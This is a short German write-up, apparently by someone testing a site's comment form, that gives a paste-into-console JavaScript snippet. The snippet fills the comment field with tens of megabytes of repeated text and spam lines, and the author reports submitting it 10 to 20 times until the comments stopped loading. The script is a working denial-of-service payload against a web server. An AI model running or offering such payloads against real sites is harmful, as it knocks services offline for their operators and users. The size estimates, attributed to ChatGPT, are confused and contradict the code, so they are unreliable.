Dieser ansatz fügt nämlich möglichst viele Eingaben in das Textarea hinzu. Dieses Skript würde nicht mehr aufgehen, würde man es auf den Namens Input ausweiten -> da sehr hohe Absturzgefahr && bei der Ausweitung auf E-Mail wird natürlich gecheckt ob es ein "@" beinhaltet, aber auch da wird das Risiko enorm hoch sein, dass der Server gar abstürzen wird, oder auch ist, da ich es selbst ausprobiert hatte und diese Anzahl wirklich die Absolute Obergrenze ausmacht.

Mit ChatGPT ausgerechnet würde es das JSON File, also die Dateigrösse pro Ausführung um ~33–35 MB Text vergrössern. Das heisst, würde man es über 10 Mal ausführen während dies so kanpp 10*34 MB und das wären 340 MG und in GB wären dies ≈ (0,032–0,034 GB) * 10 natürlich 0.3 GB, was natürlich schon noch relativ viel ist.

```javascript
// In die Browser-Konsole kopieren und Enter → dann auf "Senden" klicken
let comment = "A".repeat(23_000_000); // 5 Millionen A's = ca. 5 MB
for(let i = 0; i < 20; i++) {        // 20 × 5 MB = 100 MB
    comment += "\nSpam Nummer " + i + " – Die Datei wird immer größer! ".repeat(10000);
}
document.querySelector('#comment').value = comment;
console.log("100 MB Kommentar bereit – jetzt abschicken!");
```

Nachdem ich dieses Skript über 10 - 20 Mal ausgeführt hatte, wurde das holen der Kommentare auf der webseite immer und immer länger, bis sie auch dann mal gar nicht mehr angezeigt wurden, weil die Antwort einfach viel zu lange ging.
